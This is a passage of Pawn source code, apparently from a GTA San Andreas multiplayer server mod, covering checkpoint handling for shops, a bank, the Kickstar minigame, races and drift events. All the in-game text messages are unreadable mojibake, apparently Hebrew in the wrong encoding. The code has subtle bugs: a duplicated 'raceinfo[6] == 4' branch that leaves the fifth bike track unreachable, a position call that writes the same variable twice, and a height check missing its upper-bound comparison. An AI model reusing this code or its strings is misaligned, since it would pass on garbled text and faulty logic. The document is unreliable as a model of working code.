						SendClientMessage(playerid,orange," /usebomb :·хыь ьф∙·ю∙ сЇЎЎф ∙щ∙ ьъ Єэ фЇўхуф");
						format(talkBubble,sizeof(talkBubble),"ыря ·хыь ьўЁх· ЇЎЎх· юыь ющЁщ ёхтщэ");
						NPCTalk("DM_BombShop","ыря ·хыь ьўЁх· ЇЎЎх· юыь ющЁщ ёхтщэ",playerid,1,1);
						command(playerid,"/buybomb");
					}
					case store_phones:
					{
						SendClientMessage(playerid,orange," /buyphone :ыря ·хыь ьўЁх· ЇьрЇхЁщэ юёхтщэ ∙хЁщэ Єэ фЇўхуф");
						format(talkBubble,sizeof(talkBubble),"ыря ·хыь ьўЁх· ЇьрЇхя Єэ юьр рЇ∙°хщх· ютЁщсх·");
						NPCTalk("DM_PhoneShop","ыря ·хыь ьўЁх· ЇьрЇхя Єэ юьр рЇ∙°хщх· ютЁщсх·",playerid,1,1);
					}
				}
			}
			case cp_info:
			{
				SendClientMessage(playerid,lightblue," - :с°хыщэ фсрщэ ьющуЄхя -");
				for(new i = 1; i <= max_bb; i++)
				{
					format(string,sizeof(string),"Message%d",i);
					if(fkeyexist(file_bb,string) && !equal(fgetstring(file_bb,string),"None"))
					{
						format(string,sizeof(string)," Х %d) " @c(yellow) "%s",i,fgetstring(file_bb,string));
						SendClientMessage(playerid,white,string);
					}
				}
				SendClientMessage(playerid,orange," /para :юЎЁч счщЁэ | /arm :ющьхщ ютя сЄу 8$ | /life :ющьхщ чщщэ сЄу 5$");
				Tip(playerid);
			}
			case cp_vstation:
			{
				if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
				{
					SendClientMessage(playerid,lightblue," - :с°хыщэ фсрщэ ь·чЁ· ф°ыс -");
					new Float:vh;
					GetVehicleHealth(GetPlayerVehicleID(playerid),vh);
					if(vh >= 1000.0) SendClientMessage(playerid,orange," !ь°ыс ∙ьъ щ∙ чщщэ юьрщэ");
					else
					{
						format(string,sizeof(string)," !ыущ ь·ўя рх·х сЄу 4$ /vstation ь°ыс ∙ьъ щ∙ ы-%.0f чщщэ. ф∙·ю∙ сЇўхуф",vh);
						SendClientMessage(playerid,orange,string);
					}
					SendClientMessage(playerid,orange," .Ёщ·я ьюьр ыря уьў ь°ыс ∙ьъ: ыущ ьюьр ∙т° рх·х ыря");
					Tip(playerid);
				}
				else SendClientMessage(playerid,orange," .Єьщъ ьфщх· с°ыс ыущ ьф∙·ю∙ с·чЁ· ф°ыс");
			}
			case cp_jumping: playerinfo[playerid][jumpower] = 0;
			case cp_dancing: SendClientMessage(playerid,pink," /dance /sdance !фсюф ∙ьъ");
		}
	}
	playerinfo[playerid][incp] = 1;
	if(playerinfo[playerid][inkickstar] && kickstarinfo[0])
	{
		PlaySound(playerid,1058);
		string = "";
		playerinfo[playerid][kickstarscore]++;
		format(string,sizeof(string),"~n~~n~~n~~n~~n~~n~~p~kickstar score: ~w~%d",playerinfo[playerid][kickstarscore]);
		if(++playerinfo[playerid][kickstarbonus] == 3 && !playerinfo[playerid][kickstarprize] && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
		{
			playerinfo[playerid][kickstarprize] = 1;
			if(IsBike(GetPlayerVehicleID(playerid)))
			{
				format(string,sizeof(string),"%s~n~~b~+ anti bike fall!",string);
				playerinfo[playerid][abf][0] = 0, playerinfo[playerid][abf][1] = GetPlayerVehicleID(playerid);
			}
			else
			{
				format(string,sizeof(string),"%s~n~~y~+ vehicle speed!",string);
				playerinfo[playerid][speedup][0] = 1.1, playerinfo[playerid][speedup][1] = 1.1, playerinfo[playerid][speedup][2] = 1.0;
			}
		}
		if(IsPlayerInAnyVehicle(playerid)) RepairVehicle(GetPlayerVehicleID(playerid));
		GameTextForPlayer(playerid,string,750,3);
		new rnd = -1, tests = 0, td[M_S], arr[MAX_PLAYERS], pos = 0, ids[3] = {-1,...}, maxi[3] = {0,...};
		do
		{
			if(tests == 10) break;
			rnd = random(sizeof(Kickstar)), tests++;
		}
		while rnd < 0 || rnd > sizeof(Kickstar)-1 || IsSomeoneNearKSPos(rnd);
		for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][inkickstar])
		{
			DisablePlayerCheckpoint(i);
			SetPlayerCP(i,Kickstar[rnd][0],Kickstar[rnd][1],Kickstar[rnd][2],4.5);
			if(i != playerid) playerinfo[i][kickstarbonus] = 0;
			arr[pos++] = i;
		}
		for(new i = 0; i < pos; i++) if(playerinfo[arr[i]][kickstarscore] > maxi[0]) ids[0] = arr[i], maxi[0] = playerinfo[arr[i]][kickstarscore];
		for(new i = 0; i < pos; i++) if(arr[i] != ids[0] && playerinfo[arr[i]][kickstarscore] <= maxi[0] && playerinfo[arr[i]][kickstarscore] > maxi[1]) ids[1] = arr[i], maxi[1] = playerinfo[arr[i]][kickstarscore];
		for(new i = 0; i < pos; i++) if(arr[i] != ids[0] && arr[i] != ids[1] && playerinfo[arr[i]][kickstarscore] <= maxi[1] && playerinfo[arr[i]][kickstarscore] > maxi[2]) ids[2] = arr[i], maxi[2] = playerinfo[arr[i]][kickstarscore];
		format(td,sizeof(td),"\t~b~~h~~h~Kickstar:~w~~n~~n~1.\t%s - %d~n~2.\t%s - %d~n~3.\t%s - %d",GetName(ids[0]),maxi[0],GetName(ids[1]),maxi[1],GetName(ids[2]),maxi[2]);
		TextDrawSetString(activityHighScores,td);
	}
	#if lagtest
		LagTest_End("OnPlayerEnterCheckpoint");
	#endif
	if(debugstate) printf("OnPlayerEnterCheckpoint(%s(%d)) end",GetName(playerid),playerid);
	return 1;
}
//=[OnPlayerLeaveCheckpoint]====================================================
public OnPlayerLeaveCheckpoint(playerid)
{
	if(debugstate) printf("OnPlayerLeaveCheckpoint(%s(%d)) start",GetName(playerid),playerid);
	Streamer_CallbackHook(STREAMER_OPLC,playerid);
	if(IsPlayerNPC(playerid)) return 1;
	#if lagtest
		LagTest_Start("OnPlayerLeaveCheckpoint");
	#endif
	if(playerinfo[playerid][incp] == 1)
	{
		switch(GetPlayerCheckpoint(playerid))
		{
			case cp_bank:
			{
				switch(random(3))
				{
					case 0: format(talkBubble,sizeof(talkBubble),"!ьф·°рх·");
					case 1: format(talkBubble,sizeof(talkBubble),"BB!");
					case 2: format(talkBubble,sizeof(talkBubble),"!·схр ∙хс");
				}
				switch(random(2))
				{
					case 0: BankNPCTalk(" !ьф·°рх·, ч∙схя фсЁў ∙ьъ щ∙р° ∙юх° сЁ·щщэ",playerid,1,1);
					case 1: BankNPCTalk(" (: !Ё·°рф сЇЄэ фсрф, ч∙схя фсЁў ∙ьъ сщущщэ шхсх·",playerid,1,1);
				}
			}
			case cp_ammu, cp_sammu:
			{
				switch(random(3))
				{
					case 0: SendClientMessage(playerid,lightpurple," ╗ !юЎЇщэ ь°рх· рх·ъ Їф ∙хс");
					case 1: SendClientMessage(playerid,lightpurple," ╗ (: !·фЁф юфЁ∙ўщэ ∙ьъ");
					case 2: SendClientMessage(playerid,lightpurple," ╗ !·схр ∙хс");
				}
			}
			case cp_gambling: if(cpinfo[playerinfo[playerid][cp]][cppar] == gambling_machine) GamblingFunction(playerid,"end");
		}
	}
	playerinfo[playerid][incp] = 0;
	#if lagtest
		LagTest_End("OnPlayerLeaveCheckpoint");
	#endif
	if(debugstate) printf("OnPlayerLeaveCheckpoint(%s(%d)) end",GetName(playerid),playerid);
	return 1;
}
//=[OnPlayerEnterRaceCheckpoint]================================================
public OnPlayerEnterRaceCheckpoint(playerid)
{
	if(debugstate) printf("OnPlayerEnterRaceCheckpoint(%s(%d)) start",GetName(playerid),playerid);
	#if lagtest
		LagTest_Start("OnPlayerEnterRaceCheckpoint");
	#endif
	Streamer_CallbackHook(STREAMER_OPERC,playerid);
	new string[M_S];
	PlaySound(playerid,1058);
	if(playerinfo[playerid][instunting] != -1)
	{
		format(string,sizeof(string),"Stunting-%d",playerinfo[playerid][instunting]);
		if(!playerinfo[playerid][donestunting][playerinfo[playerid][instunting]] && !Reward_Check(playerid,string))
		{
			Reward_Give(playerid,string);
			GiveMoney(playerid,15,34);
			playerinfo[playerid][donestunting][playerinfo[playerid][instunting]] = 1;
			new bool:doneall = true;
			for(new i = 0; i < sizeof(Stunting) && doneall; i++) if(!playerinfo[playerid][donestunting][i]) doneall = false;
			if(doneall) ObjectiveComplete(playerid,objective_stunter);
		}
		format(string,sizeof(string)," Х /stunting ?фЎьщч ьЄсх° р· р·т° фёшрЁшщэ юёЇ° #%d! °хЎщэ ьЁёх· %s",playerinfo[playerid][instunting] + 1,GetName(playerid));
		SendClientMessageToAll(green,string);
		new v = GetPlayerVehicleID(playerid);
		SetVehicleVirtualWorld(v,world_normal);
		SetVehicleToRespawn(v);
		SpawnPlayer(playerid);
		playerinfo[playerid][instunting] = -1;
		DisablePlayerRaceCheckpoint(playerid);
	}
	if(playerinfo[playerid][inrace])
	{
		DisablePlayerRaceCheckpoint(playerid);
		new maxcp = GetRaceCheckpointsCount();
		if(playerinfo[playerid][racecp] == maxcp)
		{
			raceinfo[1]--;
			playerinfo[playerid][racecp] = 0, playerinfo[playerid][inrace] = 0, playerinfo[playerid][waitrace] = 0;
			playerinfo[playerid][inact] = 0;
			CallRemoteFunction("AllowPrizeUsing","ii",playerid,1);
			SetPlayerVirtualWorld(playerid,world_normal);
			SetVehicleVirtualWorld(GetPlayerVehicleID(playerid),world_normal);
			PlaySound(playerid,1098);
			RaceTextDraw(playerid,"delete");
			if(raceinfo[4] == race6_tires) RepairVehicle(GetPlayerVehicleID(playerid));
			if(raceinfo[4] == race7_invcars && IsPlayerUsingSGuard_(playerid)) EnableGameCheat(playerid,CHEAT_INVISIBLECARS,false);
			if(raceinfo[4] == race8_waterdrive && IsPlayerUsingSGuard_(playerid)) EnableGameCheat(playerid,CHEAT_DRIVEONWATER,false);
			if(raceinfo[5] == 3)
			{
				raceinfo[5]--;
				format(string,sizeof(string)," [ЁщЎч сющ°хї сюўхэ °р∙хя! [%02d:%02d:%02d %s",playerinfo[playerid][racerecord][2],playerinfo[playerid][racerecord][1],playerinfo[playerid][racerecord][0],GetName(playerid));
				SendClientMessageToAll(lightred,string);
				SetVehicleToRespawn(GetPlayerVehicleID(playerid));
				SpawnPlayer(playerid);
				GiveMoney(playerid,headserver != playerid ? actprize_race1 : actprize_race1*2, 10);
				format(string,sizeof(string),"%s ~n~~w~is the winner in the ~y~race~w~!",GetName(playerid));
				MovingText(string,mt_activity,GetPlayerColor(playerid));
				act_SaveWin(playerid,act_Code(aid_races,raceinfo[4]));
				if(fexist(file_racerecords))
				{
					new racekey[32], int = ConvertRaceRecordToInt(playerinfo[playerid][racerecord][0],playerinfo[playerid][racerecord][1],playerinfo[playerid][racerecord][2]), rec[3];
					for(new i = 0; i < 3; i++)
					{
						format(racekey,sizeof(racekey),"Race_%d_%d_Record%d",raceinfo[4],raceinfo[6],i);
						rec[i] = fgetint(file_racerecords,racekey);
					}
					if(int > ConvertRaceRecordToInt(rec[0],rec[1],rec[2]))
					{
						for(new i = 0; i < 3; i++)
						{
							format(racekey,sizeof(racekey),"Race_%d_%d_Record%d",raceinfo[4],raceinfo[6],i);
							fsetint(file_racerecords,racekey,playerinfo[playerid][racerecord][i]);
						}
						format(racekey,sizeof(racekey),"Race_%d_%d_RecordN",raceinfo[4],raceinfo[6]);
						fsetstring(file_racerecords,racekey,GetName(playerid));
					}
				}
			}
			else if(raceinfo[5] == 2)
			{
				raceinfo[5]--;
				format(string,sizeof(string)," [ЁщЎч сющ°хї сюўхэ ∙Ёщ! [%02d:%02d:%02d %s",playerinfo[playerid][racerecord][2],playerinfo[playerid][racerecord][1],playerinfo[playerid][racerecord][0],GetName(playerid));
				SendClientMessageToAll(red,string);
				SetVehicleToRespawn(GetPlayerVehicleID(playerid));
				SpawnPlayer(playerid);
				GiveMoney(playerid,actprize_race2,10);
			}
			else if(raceinfo[5] == 1)
			{
				raceinfo[5]--;
				format(string,sizeof(string)," [ЁщЎч сющ°хї сюўхэ ∙ьщ∙щ! [%02d:%02d:%02d %s",playerinfo[playerid][racerecord][2],playerinfo[playerid][racerecord][1],playerinfo[playerid][racerecord][0],GetName(playerid));
				SendClientMessageToAll(darkred,string);
				SetVehicleToRespawn(GetPlayerVehicleID(playerid));
				SpawnPlayer(playerid);
				GiveMoney(playerid,actprize_race3,10);
			}
			if(!raceinfo[1])
			{
				SendClientMessageToAll(orange," .фющ°хї фё·щщэ");
				for(new i=0;i<MAX_PLAYERS_;i++)
				{
					if(IsPlayerConnected(i) && (playerinfo[i][inrace] || playerinfo[i][waitrace]))
					{
						playerinfo[i][inrace] = 0, playerinfo[i][waitrace] = 0, playerinfo[i][racecp] = 0, playerinfo[i][raceid] = 0;
						playerinfo[i][inact] = 0;
						SetPlayerInterior(i,0);
						SetVehicleToRespawn(GetPlayerVehicleID(i));
						SpawnPlayer(i);
						SetPlayerVirtualWorld(i,world_normal);
						SetVehicleVirtualWorld(GetPlayerVehicleID(i),world_normal);
						DisablePlayerRaceCheckpoint(i);
						PlaySound(i,1098);
						RaceTextDraw(i,"delete");
					}
				}
				raceinfo[0] = 0, raceinfo[1] = 0, raceinfo[2] = 0, raceinfo[4] = 99;
				KillTimer(raceinfo[7]);
				thereIsAct = false;
			}
		}
		else
		{
			new ta = playerinfo[playerid][racecp] == maxcp-1 ? 0 : 1;
			switch(raceinfo[4])
			{
				case race1_cars, race5_crazy, race6_tires, race7_invcars:
				{
					if(raceinfo[6] == 1) SetPlayerRaceCheckpoint(playerid,!ta,RacePositions_cars1[playerinfo[playerid][racecp]][0],RacePositions_cars1[playerinfo[playerid][racecp]][1],RacePositions_cars1[playerinfo[playerid][racecp]][2],RacePositions_cars1[playerinfo[playerid][racecp]+ta][0],RacePositions_cars1[playerinfo[playerid][racecp]+ta][1],RacePositions_cars1[playerinfo[playerid][racecp]+ta][2],20.0);
					else if(raceinfo[6] == 2) SetPlayerRaceCheckpoint(playerid,!ta,RacePositions_cars2[playerinfo[playerid][racecp]][0],RacePositions_cars2[playerinfo[playerid][racecp]][1],RacePositions_cars2[playerinfo[playerid][racecp]][2],RacePositions_cars2[playerinfo[playerid][racecp]+ta][0],RacePositions_cars2[playerinfo[playerid][racecp]+ta][1],RacePositions_cars2[playerinfo[playerid][racecp]+ta][2],20.0);
					else if(raceinfo[6] == 3) SetPlayerRaceCheckpoint(playerid,!ta,RacePositions_cars3[playerinfo[playerid][racecp]][0],RacePositions_cars3[playerinfo[playerid][racecp]][1],RacePositions_cars3[playerinfo[playerid][racecp]][2],RacePositions_cars3[playerinfo[playerid][racecp]+ta][0],RacePositions_cars3[playerinfo[playerid][racecp]+ta][1],RacePositions_cars3[playerinfo[playerid][racecp]+ta][2],20.0);
					else if(raceinfo[6] == 4) SetPlayerRaceCheckpoint(playerid,!ta,RacePositions_cars4[playerinfo[playerid][racecp]][0],RacePositions_cars4[playerinfo[playerid][racecp]][1],RacePositions_cars4[playerinfo[playerid][racecp]][2],RacePositions_cars4[playerinfo[playerid][racecp]+ta][0],RacePositions_cars4[playerinfo[playerid][racecp]+ta][1],RacePositions_cars4[playerinfo[playerid][racecp]+ta][2],20.0);
					else if(raceinfo[6] == 5) SetPlayerRaceCheckpoint(playerid,!ta,RacePositions_cars5[playerinfo[playerid][racecp]][0],RacePositions_cars5[playerinfo[playerid][racecp]][1],RacePositions_cars5[playerinfo[playerid][racecp]][2],RacePositions_cars5[playerinfo[playerid][racecp]+ta][0],RacePositions_cars5[playerinfo[playerid][racecp]+ta][1],RacePositions_cars5[playerinfo[playerid][racecp]+ta][2],20.0);
				}
				case race2_bikes:
				{
					if(raceinfo[6] == 1) SetPlayerRaceCheckpoint(playerid,!ta,RacePositions_bikes1[playerinfo[playerid][racecp]][0],RacePositions_bikes1[playerinfo[playerid][racecp]][1],RacePositions_bikes1[playerinfo[playerid][racecp]][2],RacePositions_bikes1[playerinfo[playerid][racecp]+ta][0],RacePositions_bikes1[playerinfo[playerid][racecp]+ta][1],RacePositions_bikes1[playerinfo[playerid][racecp]+ta][2],20.0);
					else if(raceinfo[6] == 2) SetPlayerRaceCheckpoint(playerid,!ta,RacePositions_bikes2[playerinfo[playerid][racecp]][0],RacePositions_bikes2[playerinfo[playerid][racecp]][1],RacePositions_bikes2[playerinfo[playerid][racecp]][2],RacePositions_bikes2[playerinfo[playerid][racecp]+ta][0],RacePositions_bikes2[playerinfo[playerid][racecp]+ta][1],RacePositions_bikes2[playerinfo[playerid][racecp]+ta][2],20.0);
					else if(raceinfo[6] == 3) SetPlayerRaceCheckpoint(playerid,!ta,RacePositions_bikes3[playerinfo[playerid][racecp]][0],RacePositions_bikes3[playerinfo[playerid][racecp]][1],RacePositions_bikes3[playerinfo[playerid][racecp]][2],RacePositions_bikes3[playerinfo[playerid][racecp]+ta][0],RacePositions_bikes3[playerinfo[playerid][racecp]+ta][1],RacePositions_bikes3[playerinfo[playerid][racecp]+ta][2],20.0);
					else if(raceinfo[6] == 4) SetPlayerRaceCheckpoint(playerid,!ta,RacePositions_bikes4[playerinfo[playerid][racecp]][0],RacePositions_bikes4[playerinfo[playerid][racecp]][1],RacePositions_bikes4[playerinfo[playerid][racecp]][2],RacePositions_bikes4[playerinfo[playerid][racecp]+ta][0],RacePositions_bikes4[playerinfo[playerid][racecp]+ta][1],RacePositions_bikes4[playerinfo[playerid][racecp]+ta][2],20.0);
					else if(raceinfo[6] == 4) SetPlayerRaceCheckpoint(playerid,!ta,RacePositions_bikes5[playerinfo[playerid][racecp]][0],RacePositions_bikes5[playerinfo[playerid][racecp]][1],RacePositions_bikes5[playerinfo[playerid][racecp]][2],RacePositions_bikes5[playerinfo[playerid][racecp]+ta][0],RacePositions_bikes5[playerinfo[playerid][racecp]+ta][1],RacePositions_bikes5[playerinfo[playerid][racecp]+ta][2],20.0);
				}
				case race3_planes:
				{
					if(raceinfo[6] == 1) SetPlayerRaceCheckpoint(playerid,4,RacePositions_planes1[playerinfo[playerid][racecp]][0],RacePositions_planes1[playerinfo[playerid][racecp]][1],RacePositions_planes1[playerinfo[playerid][racecp]][2],RacePositions_planes1[playerinfo[playerid][racecp]+ta][0],RacePositions_planes1[playerinfo[playerid][racecp]+ta][1],RacePositions_planes1[playerinfo[playerid][racecp]+ta][2],20.0);
					else if(raceinfo[6] == 2) SetPlayerRaceCheckpoint(playerid,4,RacePositions_planes2[playerinfo[playerid][racecp]][0],RacePositions_planes2[playerinfo[playerid][racecp]][1],RacePositions_planes2[playerinfo[playerid][racecp]][2],RacePositions_planes2[playerinfo[playerid][racecp]+ta][0],RacePositions_planes2[playerinfo[playerid][racecp]+ta][1],RacePositions_planes2[playerinfo[playerid][racecp]+ta][2],20.0);
					else if(raceinfo[6] == 3) SetPlayerRaceCheckpoint(playerid,4,RacePositions_planes3[playerinfo[playerid][racecp]][0],RacePositions_planes3[playerinfo[playerid][racecp]][1],RacePositions_planes3[playerinfo[playerid][racecp]][2],RacePositions_planes3[playerinfo[playerid][racecp]+ta][0],RacePositions_planes3[playerinfo[playerid][racecp]+ta][1],RacePositions_planes3[playerinfo[playerid][racecp]+ta][2],20.0);
				}
				case race4_boats, race8_waterdrive:
				{
					if(raceinfo[6] == 1) SetPlayerRaceCheckpoint(playerid,4,RacePositions_boats1[playerinfo[playerid][racecp]][0],RacePositions_boats1[playerinfo[playerid][racecp]][1],RacePositions_boats1[playerinfo[playerid][racecp]][2],RacePositions_boats1[playerinfo[playerid][racecp]+ta][0],RacePositions_boats1[playerinfo[playerid][racecp]+ta][1],RacePositions_boats1[playerinfo[playerid][racecp]+ta][2],20.0);
					else if(raceinfo[6] == 2) SetPlayerRaceCheckpoint(playerid,4,RacePositions_boats2[playerinfo[playerid][racecp]][0],RacePositions_boats2[playerinfo[playerid][racecp]][1],RacePositions_boats2[playerinfo[playerid][racecp]][2],RacePositions_boats2[playerinfo[playerid][racecp]+ta][0],RacePositions_boats2[playerinfo[playerid][racecp]+ta][1],RacePositions_boats2[playerinfo[playerid][racecp]+ta][2],20.0);
				}
			}
			if(IsPlayerInAnyVehicle(playerid) && playerinfo[playerid][racecp] % 5 == 0 && playerinfo[playerid][racecp] && raceinfo[4] == race6_tires)
			{
				GameTextForPlayer(playerid,"~g~vehicle fixed",1500,4);
				RepairVehicle(GetPlayerVehicleID(playerid));
			}
			playerinfo[playerid][racecp]++;
		}
		#pragma unused maxcp
	}
	if(playerinfo[playerid][insrace])
	{
		DisablePlayerRaceCheckpoint(playerid);
		new sizemax = 0;
		if(SRaceTypes[sraceinfo[5]][srPlace] == 1) sizemax = sizeof(SRacePositions_1);
		else if(SRaceTypes[sraceinfo[5]][srPlace] == 2) sizemax = sizeof(SRacePositions_2);
		else if(SRaceTypes[sraceinfo[5]][srPlace] == 3) sizemax = sizeof(SRacePositions_3);
		else if(SRaceTypes[sraceinfo[5]][srPlace] == 4) sizemax = sizeof(SRacePositions_4);
		if(playerinfo[playerid][sracecp] == sizemax-1 || (sraceinfo[5] == 1 && playerinfo[playerid][sracecp] == (CountOfSRaceTypeInArray(2,0) + CountOfSRaceTypeInArray(2,1) + CountOfSRaceTypeInArray(2,2) - 1)))
		{
			sraceinfo[1]--;
			playerinfo[playerid][sracecp] = 0, playerinfo[playerid][insrace] = 0, playerinfo[playerid][waitsrace] = 0;
			playerinfo[playerid][inact] = 0;
			SetPlayerVirtualWorld(playerid,world_normal);
			SetFreeze(playerid,0);
			ToggleWaterWalk(playerid,0);
			if(IsFlying(playerid))
			{
				StopFlying(playerid);
				playerinfo[playerid][gm] = 0;
				SetPlayerHealth(playerid,100.0);
			}
			if(IsPlayerAttachedObjectSlotUsed(playerid,aoslot_underwater)) RemovePlayerAttachedObject(playerid,aoslot_underwater);
			if(sraceinfo[4] == 3)
			{
				sraceinfo[4]--;
				format(string,sizeof(string)," !сюўхэ ф°р∙хя %s-ЁщЎч с %s",SRaceTypes[sraceinfo[5]][srName],GetName(playerid));
				SendClientMessageToAll(SRaceTypes[sraceinfo[5]][srWin][0],string);
				GiveMoney(playerid,headserver != playerid ? actprize_srace1 : actprize_srace1*2,10);
				format(string,sizeof(string),"%s ~n~~w~is the winner in the ~y~~h~~h~%s~w~!",GetName(playerid),SRaceTypes[sraceinfo[5]][srName]);
				act_SaveWin(playerid,act_Code(aid_sraces,sraceinfo[5]));
				MovingText(string,mt_activity,GetPlayerColor(playerid));
			}
			else if(sraceinfo[4] == 2)
			{
				sraceinfo[4]--;
				format(string,sizeof(string)," !сюўхэ ф∙Ёщ %s-ЁщЎч с %s",SRaceTypes[sraceinfo[5]][srName],GetName(playerid));
				SendClientMessageToAll(SRaceTypes[sraceinfo[5]][srWin][1],string);
				GiveMoney(playerid,actprize_srace2,10);
			}
			else if(sraceinfo[4] == 1)
			{
				sraceinfo[4]--;
				format(string,sizeof(string)," !сюўхэ ф∙ьщ∙щ %s-ЁщЎч с %s",SRaceTypes[sraceinfo[5]][srName],GetName(playerid));
				SendClientMessageToAll(SRaceTypes[sraceinfo[5]][srWin][2],string);
				GiveMoney(playerid,actprize_srace3,10);
				SendClientMessageToAll(SRaceTypes[sraceinfo[5]][srWin][2]," .фющ°хї фющхчу фё·щщэ");
				for(new i=0;i<MAX_PLAYERS_;i++)
				{
					if(IsPlayerConnected(i) && (playerinfo[i][insrace] || playerinfo[i][waitsrace]))
					{
						playerinfo[i][insrace] = 0, playerinfo[i][waitsrace] = 0, playerinfo[i][sracecp] = 0;
						playerinfo[i][inact] = 0;
						SetPlayerInterior(i,0);
						SetPlayerVirtualWorld(i,world_normal);
						if(IsPlayerAttachedObjectSlotUsed(i,aoslot_underwater)) RemovePlayerAttachedObject(i,aoslot_underwater);
						DisablePlayerRaceCheckpoint(i);
						SetFreeze(i,0);
						ToggleWaterWalk(i,0);
						if(IsFlying(i))
						{
							StopFlying(i);
							playerinfo[i][gm] = 0;
							SetPlayerHealth(i,100.0);
						}
					}
				}
				sraceinfo[0] = 0, sraceinfo[1] = 0, sraceinfo[2] = 0;
				thereIsAct = false;
			}
		}
		else
		{
			new pCp = playerinfo[playerid][sracecp];
			if(SRaceTypes[sraceinfo[5]][srPlace] == 1)
			{
				if(pCp == (sizemax-2)) SetPlayerRaceCheckpoint(playerid,SRacePositions_1[pCp][srType] == 1? 1:4,SRacePositions_1[pCp][srX],SRacePositions_1[pCp][srY],SRacePositions_1[pCp][srZ],SRacePositions_1[pCp][srX],SRacePositions_1[pCp][srY],SRacePositions_1[pCp][srZ],20.0);
				else SetPlayerRaceCheckpoint(playerid,SRacePositions_1[pCp][srType] == 1? 0:3,SRacePositions_1[pCp][srX],SRacePositions_1[pCp][srY],SRacePositions_1[pCp][srZ],SRacePositions_1[pCp+1][srX],SRacePositions_1[pCp+1][srY],SRacePositions_1[pCp+1][srZ],20.0);
			}
			else if(SRaceTypes[sraceinfo[5]][srPlace] == 2)
			{
				if(pCp == (sizemax-2)) SetPlayerRaceCheckpoint(playerid,4,SRacePositions_2[pCp][srX],SRacePositions_2[pCp][srY],SRacePositions_2[pCp][srZ],SRacePositions_2[pCp][srX],SRacePositions_2[pCp][srY],SRacePositions_2[pCp][srZ],20.0);
				else SetPlayerRaceCheckpoint(playerid,3,SRacePositions_2[pCp][srX],SRacePositions_2[pCp][srY],SRacePositions_2[pCp][srZ],SRacePositions_2[pCp+1][srX],SRacePositions_2[pCp+1][srY],SRacePositions_2[pCp+1][srZ],20.0);
			}
			else if(SRaceTypes[sraceinfo[5]][srPlace] == 3)
			{
				if(pCp == (sizemax-2)) SetPlayerRaceCheckpoint(playerid,SRacePositions_3[pCp][srType] == 1? 1:4,SRacePositions_3[pCp][srX],SRacePositions_3[pCp][srY],SRacePositions_3[pCp][srZ],SRacePositions_3[pCp][srX],SRacePositions_3[pCp][srY],SRacePositions_3[pCp][srZ],20.0);
				else SetPlayerRaceCheckpoint(playerid,SRacePositions_3[pCp][srType] == 1? 0:3,SRacePositions_3[pCp][srX],SRacePositions_3[pCp][srY],SRacePositions_3[pCp][srZ],SRacePositions_3[pCp+1][srX],SRacePositions_3[pCp+1][srY],SRacePositions_3[pCp+1][srZ],20.0);
			}
			else if(SRaceTypes[sraceinfo[5]][srPlace] == 4)
			{
				if(pCp == (sizemax-2)) SetPlayerRaceCheckpoint(playerid,SRacePositions_4[pCp][srType] == 1? 1:4,SRacePositions_4[pCp][srX],SRacePositions_4[pCp][srY],SRacePositions_4[pCp][srZ],SRacePositions_4[pCp][srX],SRacePositions_4[pCp][srY],SRacePositions_4[pCp][srZ],20.0);
				else SetPlayerRaceCheckpoint(playerid,SRacePositions_4[pCp][srType] == 1? 0:3,SRacePositions_4[pCp][srX],SRacePositions_4[pCp][srY],SRacePositions_4[pCp][srZ],SRacePositions_4[pCp+1][srX],SRacePositions_4[pCp+1][srY],SRacePositions_4[pCp+1][srZ],20.0);
			}
			playerinfo[playerid][sracecp]++;
		}
	}
	if(playerinfo[playerid][indrift])
	{
		new bool:win=false, bool:atTheZ = false, Float:p[2];
		GetPlayerPos(playerid,p[0],p[0],p[1]);
		if(playerinfo[playerid][dplace] == 1) atTheZ = p[1] >= DriftPositions_1[playerinfo[playerid][driftcp]-1][2]-2.0 && DriftPositions_1[playerinfo[playerid][driftcp]-1][2]+2.0;
		else if(playerinfo[playerid][dplace] == 2) atTheZ = p[1] >= DriftPositions_2[playerinfo[playerid][driftcp]-1][2]-2.0 && DriftPositions_2[playerinfo[playerid][driftcp]-1][2]+2.0;
		else if(playerinfo[playerid][dplace] == 3) atTheZ = p[1] >= DriftPositions_3[playerinfo[playerid][driftcp]-1][2]-2.0 && DriftPositions_3[playerinfo[playerid][driftcp]-1][2]+2.0;
		if(atTheZ)
		{
			for(new i=0;i<MAX_PLAYERS_;i++)
			{
				if(IsPlayerConnected(i) && (i == playerid || i == playerinfo[playerid][dinvited]))
				{
					DisablePlayerRaceCheckpoint(i);
					new size = 0;
					if(playerinfo[i][dplace] == 1) size = sizeof(DriftPositions_1);
					else if(playerinfo[i][dplace] == 2) size = sizeof(DriftPositions_2);
					else if(playerinfo[i][dplace] == 3) size = sizeof(DriftPositions_3);
					if(atTheZ)
					{
						if(playerinfo[i][driftcp] == (size-1))
						{
							SetPlayerVirtualWorld(i,world_normal);
							SetVehicleVirtualWorld(GetPlayerVehicleID(i),world_normal);
							DisablePlayerRaceCheckpoint(i);
							win = true;
						}
						else if(playerinfo[i][driftcp] == (size-2))
						{
							if(playerinfo[i][dplace] == 1) SetPlayerRaceCheckpoint(i,1,DriftPositions_1[playerinfo[i][driftcp]][0],DriftPositions_1[playerinfo[i][driftcp]][1],DriftPositions_1[playerinfo[i][driftcp]][2],DriftPositions_1[playerinfo[i][driftcp]][0],DriftPositions_1[playerinfo[i][driftcp]][1],DriftPositions_1[playerinfo[i][driftcp]][2],11.5);
							else if(playerinfo[i][dplace] == 2) SetPlayerRaceCheckpoint(i,1,DriftPositions_2[playerinfo[i][driftcp]][0],DriftPositions_2[playerinfo[i][driftcp]][1],DriftPositions_2[playerinfo[i][driftcp]][2],DriftPositions_2[playerinfo[i][driftcp]][0],DriftPositions_2[playerinfo[i][driftcp]][1],DriftPositions_2[playerinfo[i][driftcp]][2],11.5);
							else if(playerinfo[i][dplace] == 3) SetPlayerRaceCheckpoint(i,1,DriftPositions_3[playerinfo[i][driftcp]][0],DriftPositions_3[playerinfo[i][driftcp]][1],DriftPositions_3[playerinfo[i][driftcp]][2],DriftPositions_3[playerinfo[i][driftcp]][0],DriftPositions_3[playerinfo[i][driftcp]][1],DriftPositions_3[playerinfo[i][driftcp]][2],11.5);
							playerinfo[i][driftcp]++;
						}
						else
						{
